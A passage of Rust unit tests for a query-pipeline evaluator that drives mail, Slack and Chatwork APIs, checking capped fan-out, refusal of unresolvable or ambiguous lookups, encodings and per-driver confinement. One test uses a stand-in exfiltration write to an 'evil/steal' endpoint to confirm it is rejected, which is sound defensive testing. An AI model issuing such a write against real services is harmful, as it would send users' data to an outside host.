        // …and the fan-out is BOUNDED: 51 rows is 51 requests, so it is refused with the cap
        // named rather than truncated (a silent first-50 would be a quiet wrong answer).
        let many: Vec<String> = (0..=FOLLOW_FANOUT_MAX)
            .map(|i| format!(r#"{{"id":"m{i}"}}"#))
            .collect();
        let (out, seen) = fan_out(
            "/http/maild/users/me/messages |> DECODE json |> EXPAND messages \
             |> FOLLOW id INTO /http/maild/users/me/messages/{id}",
            &[],
            format!(r#"{{"messages":[{}]}}"#, many.join(",")).as_bytes(),
            |_| panic!("the cap is checked before any request"),
        );
        match out.unwrap_err() {
            CfsError::InvalidPath { reason, .. } => {
                assert!(reason.contains("50 rows"), "names the cap: {reason}");
            }
            other => panic!("expected InvalidPath, got {other:?}"),
        }
        assert!(seen.is_empty(), "no request storm, not even a partial one");
    }

    #[test]
    fn follow_into_refuses_an_unresolvable_value_rather_than_guessing() {
        // §13.1 G4 QG3 (the 「推測するな、宣言して拒否せよ」 policy made mechanical): a row whose
        // followed field is Null is refused HERE — at the read, which is preview time — never
        // spliced as a silent Null and never sent to the wire as a garbage id.
        let (out, seen) = fan_out(
            "/http/maild/users/me/messages |> DECODE json |> EXPAND messages \
             |> FOLLOW id INTO /http/maild/users/me/messages/{id}",
            &[],
            br#"{"messages":[{"id":null}]}"#,
            |_| panic!("an unresolvable value never reaches the wire"),
        );
        match out.unwrap_err() {
            CfsError::InvalidPath { reason, .. } => assert!(
                reason.contains("never guessed"),
                "refuses rather than guesses: {reason}"
            ),
            other => panic!("expected InvalidPath, got {other:?}"),
        }
        assert!(seen.is_empty());

        // A value that resolves to NO detail row is the same refusal: "this does not resolve" is
        // an answer; picking one (or splicing Null) is not.
        let (out, _) = fan_out(
            "/http/maild/users/me/messages |> DECODE json |> EXPAND messages \
             |> FOLLOW id INTO /http/maild/users/me/messages/{id}",
            &[],
            br#"{"messages":[{"id":"gone"}]}"#,
            |_| Ok(decode(b"[]")),
        );
        match out.unwrap_err() {
            CfsError::InvalidPath { reason, .. } => assert!(
                reason.contains("exactly one row"),
                "names the resolution rule: {reason}"
            ),
            other => panic!("expected InvalidPath, got {other:?}"),
        }
    }

    #[test]
    fn follow_into_substitution_prefers_the_row_over_the_view_param() {
        // The precedence rule, pinned: `{name}` in a fan-out template resolves against the
        // DELIVERED ROW first and the view's bound `{param}` only as the outer fallback. A stage
        // whose whole meaning is "per row" must read its own row; this test fails if that flips.
        let (out, seen) = fan_out(
            "/http/maild/users/{user}/messages |> DECODE json |> EXPAND messages \
             |> FOLLOW id INTO /http/maild/users/{user}/messages/{id}",
            &[
                ("user".to_string(), "me".to_string()),
                ("id".to_string(), "PARAM".to_string()),
            ],
            br#"{"messages":[{"id":"m1"}]}"#,
            |_| Ok(decode(br#"[{"subject":"s"}]"#)),
        );
        out.expect("hydrates");
        assert_eq!(
            seen,
            vec!["/rest/maild/users/me/messages/m1"],
            "the ROW's id wins over the view param of the same name, and {{user}} falls back to \
             the view param the row does not carry"
        );
    }

    #[test]
    fn follow_into_splices_the_detail_over_a_colliding_stub_column() {
        // Splice precedence, pinned: the row carried a stub, the detail is the hydrated truth, so
        // on a name collision the DETAIL replaces the row's value — the point of list→detail.
        let (out, _) = fan_out(
            "/http/maild/users/me/messages |> DECODE json |> EXPAND messages \
             |> FOLLOW id INTO /http/maild/users/me/messages/{id}",
            &[],
            br#"{"messages":[{"id":"m1","subject":"STUB"}]}"#,
            |_| Ok(decode(br#"[{"subject":"HYDRATED"}]"#)),
        );
        let batch = out.expect("hydrates");
        assert_eq!(batch.schema.columns.len(), 2, "no duplicate column appears");
        assert_eq!(batch.rows[0].values[1], Value::Text("HYDRATED".to_string()));
    }

    #[test]
    fn eval_map_body_carries_the_declared_encode_multipart() {
        // The §13 upload shape: the parser desugared `|> ENCODE multipart VALUES (row)` onto the
        // pipeline body; the evaluator surfaces the encoding on the MapWrite for the applier.
        let body = serde_json::to_string(
            &qfs_parser::parse_statement(
                "INSERT INTO /http/chatwork/rooms/{room}/files |> ENCODE multipart VALUES (row)",
            )
            .unwrap(),
        )
        .unwrap();
        let write = eval_map_body(
            &body,
            "chatwork",
            "/chatwork/rooms/1/files",
            &[("room".to_string(), "1".to_string())],
            &incoming(&[("filename", "a.txt"), ("message", "hi")]),
            &[],
        )
        .expect("evals");
        assert_eq!(write.rest_path, "/rest/chatwork/rooms/1/files");
        assert_eq!(write.encoding.as_deref(), Some("multipart"));
        assert_eq!(write.bodies.len(), 1);
        // A bare VALUES map carries no encoding (the default JSON stays the default).
        let bare = serde_json::to_string(
            &qfs_parser::parse_statement("INSERT INTO /http/chatwork/rooms VALUES (row)").unwrap(),
        )
        .unwrap();
        let write = eval_map_body(
            &bare,
            "chatwork",
            "/chatwork/rooms",
            &[],
            &incoming(&[("x", "1")]),
            &[],
        )
        .expect("evals");
        assert_eq!(write.encoding, None);
    }

    // -----------------------------------------------------------------------
    // §13.1 G9 — the declared reverse lookup (`LET` in a map body)
    // -----------------------------------------------------------------------

    /// Store a `CREATE MAP … AS …` body the way the parser does (serde over the parsed statement).
    fn stored(src: &str) -> String {
        serde_json::to_string(&qfs_parser::parse_statement(src).unwrap()).unwrap()
    }

    /// A lookup collection: a two-column `(name, id)` relation standing in for the driver's own
    /// declared channels view.
    fn channels(rows: &[(&str, &str)]) -> RowBatch {
        RowBatch::new(
            Schema::new(vec![
                Column::new("name", ColumnType::Text, false),
                Column::new("id", ColumnType::Text, false),
            ]),
            rows.iter()
                .map(|(n, i)| {
                    Row::new(vec![
                        Value::Text((*n).to_string()),
                        Value::Text((*i).to_string()),
                    ])
                })
                .collect(),
        )
    }

    /// Two incoming rows naming two different channels — the per-row case (QG5).
    fn incoming_rows(field: &str, values: &[&str]) -> RowBatch {
        RowBatch::new(
            Schema::new(vec![Column::new(field, ColumnType::Text, false)]),
            values
                .iter()
                .map(|v| Row::new(vec![Value::Text((*v).to_string())]))
                .collect(),
        )
    }

    const LOOKUP_MAP: &str =
        "CREATE MAP CALL slack.delete ( channel text ) /slack/{ws}/messages AS \
         LET cid = /slack/{ws}/channels |> WHERE name == row.channel |> SELECT id \
         INSERT INTO /http/slack/chat.delete VALUES ({channel: cid})";

    /// The stored body of a `CREATE MAP` — the `body` column of the `/sys/drivers` row it desugars to.
    fn map_body_of(create_map: &str) -> String {
        let Statement::Effect(e) = qfs_parser::parse_statement(create_map).unwrap() else {
            panic!("CREATE MAP desugars to an INSERT");
        };
        let EffectBody::Values(values) = &e.body else {
            panic!("expected the /sys/drivers row");
        };
        let idx = values
            .columns
            .as_ref()
            .unwrap()
            .iter()
            .position(|c| c.as_str() == "body")
            .unwrap();
        match &values.rows[0][idx] {
            Expr::Lit(qfs_parser::Literal::Str(s)) => s.clone(),
            other => panic!("body column is a text literal, got {other:?}"),
        }
    }

    /// The accepted shape is extracted with its `{param}` substituted — and the extraction is PURE,
    /// so nothing here touches the wire.
    #[test]
    fn map_body_lookups_extracts_the_declared_reverse_lookup() {
        let body = map_body_of(LOOKUP_MAP);
        let found = map_body_lookups(
            &body,
            "slack",
            "/slack/T1/messages",
            &[("ws".to_string(), "T1".to_string())],
        )
        .expect("the accepted shape extracts");
        assert_eq!(
            found,
            vec![MapLookup {
                name: "cid".into(),
                source_path: "/slack/T1/channels".into(),
                match_col: "name".into(),
                row_field: "channel".into(),
                select_col: "id".into(),
            }]
        );
    }

    /// QG3 — §13 confinement on the WRITE side: a `LET` naming ANOTHER driver's surface is refused,
    /// so a declaration can never read outside its own driver to build a write.
    #[test]
    fn a_let_reading_a_foreign_driver_is_refused() {
        let body = map_body_of(
            "CREATE MAP CALL slack.delete ( channel text ) /slack/{ws}/messages AS \
             LET cid = /github/repos |> WHERE name == row.channel |> SELECT id \
             INSERT INTO /http/slack/chat.delete VALUES ({channel: cid})",
        );
        let err = map_body_lookups(&body, "slack", "/slack/T1/messages", &[])
            .expect_err("a foreign lookup source is refused");
        assert_eq!(err.code(), "invalid_path");
    }

    /// A binding that is not the one accepted shape is refused rather than approximated.
    #[test]
    fn a_let_of_an_unsupported_shape_is_refused_not_approximated() {
        let body = map_body_of(
            "CREATE MAP CALL slack.delete ( channel text ) /slack/{ws}/messages AS \
             LET cid = /slack/{ws}/channels |> LIMIT 1 \
             INSERT INTO /http/slack/chat.delete VALUES ({channel: cid})",
        );
        assert!(map_body_lookups(&body, "slack", "/slack/T1/messages", &[]).is_err());
    }

    /// A body with no `LET` yields no lookups — the shape every shipped declaration has today.
    #[test]
    fn a_body_without_a_let_yields_no_lookups() {
        let body = stored("INSERT INTO /http/slack/chat.postMessage VALUES (row)");
        assert!(map_body_lookups(&body, "slack", "/slack/post", &[])
            .expect("no LET is not an error")
            .is_empty());
    }

    /// QG5 — the binding evaluates PER ROW: two rows naming two channels produce two effect bodies
    /// carrying two different resolved ids, from ONE fetched collection.
    #[test]
    fn a_lookup_resolves_per_row_from_one_fetched_collection() {
        let body = map_body_of(LOOKUP_MAP);
        let lookups = map_body_lookups(
            &body,
            "slack",
            "/slack/T1/messages",
            &[("ws".to_string(), "T1".to_string())],
        )
        .unwrap();
        let collection = channels(&[("general", "C_GEN"), ("random", "C_RND")]);
        let write = eval_map_body(
            &body,
            "slack",
            "/slack/T1/messages",
            &[("ws".to_string(), "T1".to_string())],
            &incoming_rows("channel", &["general", "random"]),
            &[(lookups[0].clone(), collection)],
        )
        .expect("both rows resolve");
        assert_eq!(write.rest_path, "/rest/slack/chat.delete");
        let ids: Vec<String> = write
            .bodies
            .iter()
            .map(|b| match b {
                Value::Struct(f) => match &f.entries[0].1 {
                    Value::Text(s) => s.clone(),
                    other => panic!("expected the resolved id, got {other:?}"),
                },
                other => panic!("expected a struct wire body, got {other:?}"),
            })
            .collect();
        assert_eq!(
            ids,
            vec!["C_GEN".to_string(), "C_RND".to_string()],
            "each row resolved against the SAME collection, independently"
        );
    }

    /// QG6 — a name that matches nothing is a structured refusal, and because the refusal aborts the
    /// evaluation NO wire body is produced for any row: the effect leg cannot fire with a missing id.
    #[test]
    fn an_unresolvable_name_is_refused_and_no_body_is_built() {
        let body = map_body_of(LOOKUP_MAP);
        let lookups = map_body_lookups(&body, "slack", "/slack/T1/messages", &[]).unwrap();
        let err = eval_map_body(
            &body,
            "slack",
            "/slack/T1/messages",
            &[],
            &incoming_rows("channel", &["general", "nope"]),
            &[(lookups[0].clone(), channels(&[("general", "C_GEN")]))],
        )
        .expect_err("an unresolvable name refuses the whole write");
        assert_eq!(err.code(), "invalid_path");
    }

    /// QG7 — an ambiguous name is a refusal, never a pick. Taking the first match would be a silent
    /// wrong answer that looks like success.
    #[test]
    fn an_ambiguous_name_is_refused_rather_than_picked() {
        let body = map_body_of(LOOKUP_MAP);
        let lookups = map_body_lookups(&body, "slack", "/slack/T1/messages", &[]).unwrap();
        assert!(eval_map_body(
            &body,
            "slack",
            "/slack/T1/messages",
            &[],
            &incoming_rows("channel", &["general"]),
            &[(
                lookups[0].clone(),
                channels(&[("general", "C_ONE"), ("general", "C_TWO")])
            )],
        )
        .is_err());
    }

    /// The §13 form-parameter shape (ticket 20260727214856): `|> ENCODE form VALUES (row)` parses
    /// onto the same pipeline body as the multipart arm and surfaces `form` as the encoding, so the
    /// applier can pick the form encoder. This is the parse leg of the Chatwork-400 fix — the
    /// shipped `INSERT INTO /chatwork/rooms/{room}/messages` sends a JSON body to an endpoint that
    /// takes only `application/x-www-form-urlencoded`.
    #[test]
    fn eval_map_body_carries_the_declared_encode_form() {
        let body = serde_json::to_string(
            &qfs_parser::parse_statement(
                "INSERT INTO /http/chatwork/rooms/{room}/messages |> ENCODE form VALUES (row)",
            )
            .unwrap(),
        )
        .unwrap();
        let write = eval_map_body(
            &body,
            "chatwork",
            "/chatwork/rooms/7/messages",
            &[("room".to_string(), "7".to_string())],
            &incoming(&[("body", "hello")]),
            &[],
        )
        .expect("evals");
        assert_eq!(write.rest_path, "/rest/chatwork/rooms/7/messages");
        assert_eq!(write.encoding.as_deref(), Some("form"));
        assert_eq!(write.bodies.len(), 1);
    }

    #[test]
    fn eval_map_body_rejects_a_foreign_target() {
        // §13 confinement (write side): a map body writing to a FOREIGN `/http/<other>` host is the
        // anti-exfiltration violation — rejected before any body is evaluated.
        let body = serde_json::to_string(
            &qfs_parser::parse_statement("INSERT INTO /http/evil/steal VALUES (row)").unwrap(),
        )
        .unwrap();
        let err = eval_map_body(
            &body,
            "slack",
            "/slack/post",
            &[],
            &incoming(&[("x", "1")]),
            &[],
        )
        .unwrap_err();
        match err {
            CfsError::InvalidPath { reason, .. } => {
                assert!(
                    reason.contains("confinement"),
                    "confinement reason: {reason}"
                )
            }
            other => panic!("expected InvalidPath, got {other:?}"),
        }
    }
}
